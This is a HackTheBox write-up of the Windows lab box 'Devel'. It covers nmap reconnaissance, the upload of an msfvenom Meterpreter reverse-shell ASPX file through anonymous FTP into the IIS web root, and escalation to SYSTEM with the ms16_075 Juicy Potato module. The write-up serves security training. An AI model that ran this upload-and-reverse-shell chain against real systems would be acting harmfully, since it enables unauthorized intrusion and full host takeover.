---
title: "Devel - HackTheBox Writeup"
date: 2026-04-20 00:00:00 +0000
categories: [boxes]
tags: [hackthebox, windows, easy, ftp, iis, aspx, ms16_075, seimpersonate]
image:
  path: /assets/img/box/15/logo.png
  alt: Devel HackTheBox Machine
---

# Devel — HackTheBox Writeup

<p align="center"> <img src="/assets/img/box/15/logo.png" width="150"/> </p>

**Platform:** HackTheBox
**OS:** Windows
**Difficulty:** Easy
**Author:** al3xx

---

## Summary

Devel exploits an anonymous FTP server that shares its root with the IIS web directory, allowing direct upload of an ASPX reverse shell. Once inside as the IIS service account, `SeImpersonatePrivilege` is abused via the Juicy Potato (ms16_075) exploit to escalate to `NT AUTHORITY\SYSTEM`.

---

## Reconnaissance

```bash
nmap -sCV 10.129.6.172
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
```

Two ports open:

- **FTP (21)** — Microsoft FTPd with **anonymous login enabled**. The root contains default IIS files.
- **HTTP (80)** — Microsoft IIS 7.5 serving the default IIS7 welcome page. No interesting routes found via directory brute-forcing.

![POC 1](/assets/img/box/15/poc1.png)

---

## Foothold — FTP Write Access → ASPX Webshell

### Confirming shared web root

Accessing `http://10.129.6.172/iisstart.htm` and `welcome.png` via curl confirmed the FTP root and the web root are the **same directory**.

```bash
curl http://10.129.6.172/iisstart.htm -I
# HTTP/1.1 200 OK
# Server: Microsoft-IIS/7.5
```

A quick write test confirmed upload access:

```
ftp> put hello.txt
226 Transfer complete.
```

```bash
curl http://10.129.6.172/hello.txt
Hello World
```

### Uploading the reverse shell

IIS 7.5 executes `.aspx` files. A Meterpreter reverse shell payload was generated and uploaded via FTP:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.158 LPORT=4444 \
    -f aspx -o shell.aspx
```

```
[-] No platform selected, choosing Msf::Module::Platform::Windows
[-] No arch selected, selecting arch: x86
Payload size: 354 bytes
Final size of aspx file: 2881 bytes
Saved as: shell.aspx
```

```
ftp> put shell.aspx
```

Trigger the shell:

```bash
curl http://10.129.6.172/shell.aspx
```

### Shell received

```
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

```
PS C:\windows\system32\inetsrv> whoami
iis apppool\web
```

---

## Privilege Escalation — SeImpersonatePrivilege → SYSTEM

### Checking token privileges

```
PS C:\windows\system32\inetsrv> whoami /priv

SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
SeCreateGlobalPrivilege  Create global objects                       Enabled
```

`SeImpersonatePrivilege` is enabled — a classic Potato-family attack surface.

### Local exploit suggester

Running `multi/recon/local_exploit_suggester` returned:

```
[+] 10.129.6.172 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.6.172 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
```

### Exploiting with Juicy Potato (ms16_075)

```
use exploit/windows/local/ms16_075_reflection_juicy
```

```
C:\Windows\system32> whoami
nt authority\system
```
